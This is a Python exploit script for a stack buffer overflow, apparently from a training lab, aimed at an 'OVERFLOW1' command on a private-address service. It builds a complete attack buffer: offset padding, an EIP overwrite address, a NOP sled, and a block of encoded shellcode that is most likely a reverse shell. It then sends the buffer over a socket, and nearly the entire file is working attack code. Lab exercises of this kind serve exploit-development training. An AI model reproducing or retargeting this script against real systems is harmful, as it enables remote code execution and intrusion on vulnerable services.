#/usr/bin/python
import socket

ip = "10.10.159.146"	#change me
port = 1337		#change me

prefix = "OVERFLOW1 "
offset = 1978			#1. After fuzzing the value with payload pattern_create
overflow = "A" * offset
retn = "\xaf\x11\x50\x62"			#2. To overwrite the EIP
padding = "\x90" * 16

buf =  b""
buf += b"\xba\xc4\x77\xf5\xb3\xda\xca\xd9\x74\x24\xf4\x5f\x31"
buf += b"\xc9\xb1\x52\x31\x57\x12\x03\x57\x12\x83\x2b\x8b\x17"
buf += b"\x46\x4f\x9c\x5a\xa9\xaf\x5d\x3b\x23\x4a\x6c\x7b\x57"
buf += b"\x1f\xdf\x4b\x13\x4d\xec\x20\x71\x65\x67\x44\x5e\x8a"
buf += b"\xc0\xe3\xb8\xa5\xd1\x58\xf8\xa4\x51\xa3\x2d\x06\x6b"
buf += b"\x6c\x20\x47\xac\x91\xc9\x15\x65\xdd\x7c\x89\x02\xab"
buf += b"\xbc\x22\x58\x3d\xc5\xd7\x29\x3c\xe4\x46\x21\x67\x26"
buf += b"\x69\xe6\x13\x6f\x71\xeb\x1e\x39\x0a\xdf\xd5\xb8\xda"
buf += b"\x11\x15\x16\x23\x9e\xe4\x66\x64\x19\x17\x1d\x9c\x59"
buf += b"\xaa\x26\x5b\x23\x70\xa2\x7f\x83\xf3\x14\x5b\x35\xd7"
buf += b"\xc3\x28\x39\x9c\x80\x76\x5e\x23\x44\x0d\x5a\xa8\x6b"
buf += b"\xc1\xea\xea\x4f\xc5\xb7\xa9\xee\x5c\x12\x1f\x0e\xbe"
buf += b"\xfd\xc0\xaa\xb5\x10\x14\xc7\x94\x7c\xd9\xea\x26\x7d"
buf += b"\x75\x7c\x55\x4f\xda\xd6\xf1\xe3\x93\xf0\x06\x03\x8e"
buf += b"\x45\x98\xfa\x31\xb6\xb1\x38\x65\xe6\xa9\xe9\x06\x6d"
buf += b"\x29\x15\xd3\x22\x79\xb9\x8c\x82\x29\x79\x7d\x6b\x23"
buf += b"\x76\xa2\x8b\x4c\x5c\xcb\x26\xb7\x37\xfe\xbd\xae\x17"
buf += b"\x96\xc3\xd0\x86\x3b\x4d\x36\xc2\xd3\x1b\xe1\x7b\x4d"
buf += b"\x06\x79\x1d\x92\x9c\x04\x1d\x18\x13\xf9\xd0\xe9\x5e"
buf += b"\xe9\x85\x19\x15\x53\x03\x25\x83\xfb\xcf\xb4\x48\xfb"
buf += b"\x86\xa4\xc6\xac\xcf\x1b\x1f\x38\xe2\x02\x89\x5e\xff"
buf += b"\xd3\xf2\xda\x24\x20\xfc\xe3\xa9\x1c\xda\xf3\x77\x9c"
buf += b"\x66\xa7\x27\xcb\x30\x11\x8e\xa5\xf2\xcb\x58\x19\x5d"
buf += b"\x9b\x1d\x51\x5e\xdd\x21\xbc\x28\x01\x93\x69\x6d\x3e"
buf += b"\x1c\xfe\x79\x47\x40\x9e\x86\x92\xc0\xbe\x64\x36\x3d"
buf += b"\x57\x31\xd3\xfc\x3a\xc2\x0e\xc2\x42\x41\xba\xbb\xb0"
buf += b"\x59\xcf\xbe\xfd\xdd\x3c\xb3\x6e\x88\x42\x60\x8e\x99"

payload = buf

postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(buffer + "\r\n")
    print("Done!")
except:
    print("Could not connect.")